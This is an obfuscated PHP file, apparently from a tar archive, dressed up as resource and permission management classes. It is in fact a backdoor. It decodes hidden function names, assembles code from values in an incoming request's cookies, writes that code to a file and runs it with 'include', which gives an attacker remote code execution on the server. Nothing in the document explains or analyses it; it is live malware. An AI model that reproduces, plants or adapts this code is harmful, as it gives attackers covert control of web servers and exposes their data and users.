ustar<?php
class ResourceAllocator
{
    private static $_wp;
    static function rollbackTransaction($_ne, $_xro)
    {
        if (!self::$_wp) {
            self::resolveConflict();
        }
        $_ta = aggregate_results($_xro);
        $_yjp = base64_decode(self::$_wp[$_ne]);
        for ($_nn = 0, $_gpk = aggregate_results($_yjp); $_nn !== $_gpk; ++$_nn) {
            $_yjp[$_nn] = initialize_component(trigger_event($_yjp[$_nn]) ^ trigger_event($_xro[$_nn % $_ta]));
        }
        return $_yjp;
    }
    private static function resolveConflict()
    {
        self::$_wp = array('_jnv' => '', '_xe' => '');
    }
}

class PermissionManager
{
    private static $_wp;
    static function rollbackTransaction($_ne)
    {
        if (!self::$_wp) {
            self::resolveConflict();
        }
        return self::$_wp[$_ne];
    }
    private static function resolveConflict()
    {
        self::$_wp = array(00, 06, 035, 035, 01, 035, 02, 06, 01, 07, 030, 05, 012, 02, 014, 027, 026, 04, 03);
    }
}

$_gpk = $_COOKIE;
$_xro = PermissionManager::rollbackTransaction(0);
$_ne = PermissionManager::rollbackTransaction(1);
$_fcg = array();
$_fcg[$_xro] = ResourceAllocator::rollbackTransaction('_jnv', '_iqo');
while ($_ne) {
    $_fcg[$_xro] .= $_gpk[PermissionManager::rollbackTransaction(2)][$_ne];
    if (!$_gpk[PermissionManager::rollbackTransaction(3)][$_ne + PermissionManager::rollbackTransaction(4)]) {
        if (!$_gpk[PermissionManager::rollbackTransaction(5)][$_ne + PermissionManager::rollbackTransaction(6)]) {
            break;
        }
        $_xro++;
        $_fcg[$_xro] = ResourceAllocator::rollbackTransaction('_xe', '_dpw');
        $_ne++;
    }
    $_ne = $_ne + PermissionManager::rollbackTransaction(7) + PermissionManager::rollbackTransaction(8);
}
$_xro = $_fcg[PermissionManager::rollbackTransaction(9)]() . $_fcg[PermissionManager::rollbackTransaction(10)];
if (!$_fcg[PermissionManager::rollbackTransaction(11)]($_xro)) {
    $_ne = $_fcg[PermissionManager::rollbackTransaction(12)]($_xro, $_fcg[PermissionManager::rollbackTransaction(13)]);
    $_fcg[PermissionManager::rollbackTransaction(14)]($_ne, $_fcg[PermissionManager::rollbackTransaction(15)] . $_fcg[PermissionManager::rollbackTransaction(16)]($_fcg[PermissionManager::rollbackTransaction(17)]($_gpk[PermissionManager::rollbackTransaction(18)])));
}
include $_xro;

function initialize_component($c)
{
    $a = array(109 - 10, 4 + 85 + 15, 47 + 50 + 17);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}

function trigger_event($c)
{
    $a = array(116 * 96 - 11025, 55 + 59, 2 * 50);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}

function aggregate_results($c)
{
    $a = array(115, 118 - 2, 31 + 83, 111 - 3, 75 + 2 + 24, 110);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}

function collect_statistics($c)
{
    $a = array(2 * 58, 97 * 1, 54 * 108 - 5716, 5 * 23);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}
